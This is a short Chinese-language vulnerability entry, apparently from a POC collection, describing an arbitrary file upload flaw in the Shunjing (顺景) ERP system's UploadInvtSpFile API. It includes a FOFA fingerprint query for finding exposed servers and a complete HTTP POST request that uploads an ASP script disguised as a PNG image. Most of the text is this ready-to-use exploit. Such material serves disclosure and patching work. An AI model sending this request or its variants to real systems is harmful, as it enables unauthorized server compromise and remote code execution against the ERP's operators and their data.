# 顺景ERP管理系统UploadInvtSpFile存在任意文件上传漏洞

顺景ERP管理系统UploadInvtSpFile存在任意文件上传漏洞，允许攻击者上传恶意文件到服务器，可能导致远程代码执行、网站篡改或其他形式的攻击，严重威胁系统和数据安全。

## fofa

```javascript
body="/api/DBRecord/getDBRecords"
```

## poc

```javascript
POST /api/cgInvtSp/UploadInvtSpFile HTTP/1.1
Host: 
Content-Type: multipart/form-data; boundary=-----------------1111
Content-Length: 178

-------------------1111
Content-Disposition: form-data; name="filedata"; filename="2142142142.asp"
Content-Type: image/png

<% response.write("1111")%>
-------------------1111--
```

![ebb92616e1835d80e80f6c6cb97ee814](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409111921995.png)



## 漏洞来源

- https://mp.weixin.qq.com/s/BrbgHxUO4GJ0Haza5xf6dQ